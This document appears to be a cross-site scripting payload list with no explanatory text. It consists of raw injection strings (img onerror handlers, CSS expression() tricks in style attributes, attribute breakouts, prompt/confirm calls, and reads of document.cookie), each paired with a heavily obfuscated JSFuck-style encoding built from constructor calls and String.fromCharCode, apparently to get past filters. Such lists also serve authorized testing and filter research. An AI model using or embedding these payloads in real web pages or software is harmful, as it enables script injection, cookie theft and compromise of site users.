String.fromCharCode(62)")()
<IMG style="font-fa"onerror=prompt(399)mily: 'arial'" src="x:x">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(false+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([false]+"")[10]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+(false+"")[1]+(true+"")[1]+([false]+"")[10]+(false+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<p style="font-family:'ar&quot;;x=expression(prompt(401))/*ial'"></p>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+[0]+"")[7]+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(false+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([false]+"")[10]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+(false+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(113)")()+(undefined+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+(true+"")[3]+(false+"")[3]+(false+"")[3]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(42)")()+([false]+"")[10]+(false+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<P style="FONT-FAMILY: 'ar';x:expression(prompt(403))/*ial'"></P>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+[0]+"")[7]+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(false+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([false]+"")[10]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+(false+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+(true+"")[3]+(false+"")[3]+(false+"")[3]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(42)")()+([false]+"")[10]+(false+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<p style = "font-family: 'ar\27\3bx\3a expression\28\611prompt\28\31\2\9\29\3bal'" ></p>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+[0]+"")[7]+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(false+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([false]+"")[10]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+(false+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+!+[]+!+[]+!+[]+[])[0]+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+!+[]+!+[]+!+[]+[])[0]+(false+"")[1]+(false+[0]+"")[7]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+(true+"")[3]+(false+"")[3]+(false+"")[3]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+!+[]+!+[]+!+[]+[])[0]+([][""]+"")[2]+(false+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<o style=FONT-FAMILY:'ar'; x:expression(prompt(407));oa;'"></p>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+[0]+"")[7]+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(false+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([false]+"")[10]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+(false+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+(true+"")[3]+(false+"")[3]+(false+"")[3]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<article xmlns ="urn:img src=x onerror=xss()//"" > 123
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[1]+(true+"")[1]+(true+"")[0]+([false]+"")[10]+([false]+"")[3]+(false+"")[2]+(true+"")[3]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+(undefined+"")[1]+(false+"")[3]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(undefined+"")[0]+(true+"")[1]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+([false]+"")[11]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+(false+[0]+"")[7]+(+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]
<?XML:NAMESPACE PREFIX = [default] >
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(63)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(undefined+"")[1]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+"")[1]+([false]+"")[3]+(true+"")[3]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+(true+"")[3]+(false+"")[0]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(false+[0]+"")[7]+([false]+"")[13]+([][""]+"")[4]+(true+"")[3]+(false+"")[0]+(false+"")[1]+(undefined+"")[0]+(false+"")[2]+(true+"")[0]+([false]+"")[14]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=x onerror=prompt(413) NS="> /*XSS-413 Here*/
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+(false+[0]+"")[7]+(undefined+"")[1]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(42)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(false+[0]+"")[7]+(+(101))["to"+String["name"]]()[1]+(true+"")[3]+(true+"")[1]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(42)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()
<img src=x onerror=prompt(415)" />
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<article xmlns=">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[1]+(true+"")[1]+(true+"")[0]+([false]+"")[10]+([false]+"")[3]+(false+"")[2]+(true+"")[3]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+(undefined+"")[1]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=x onerror=prompt(419)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
prompt('xss')
[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]
prompt(423)
[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]
confirm('xss2')
([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[0]+([false]+"")[10]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]
confirm("427")
([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[0]+([false]+"")[10]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]
prompt(/xss/.source)
[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(true+"")[1]+([false]+"")[3]+(true+"")[3]+([false]+"")[12]
window[/prompt/.source](83)
[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+([false]+"")[10]+(undefined+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(true+"")[1]+([false]+"")[3]+(true+"")[3]+([false]+"")[14]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]
with(document)prompt(cookie)
[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+([false]+"")[10]+(true+"")[0]+(+(101))["to"+String["name"]]()[1]+([false]+"")[11]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[3]+(undefined+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+(undefined+"")[1]+(true+"")[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+([false]+"")[10]+(true+"")[3]+([false]+"")[12]
prompt(document['cookie'])
[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[3]+(undefined+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+(undefined+"")[1]+(true+"")[0]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+([false]+"")[10]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[14]+([false]+"")[12]
prompt(document[/cookie/.source])
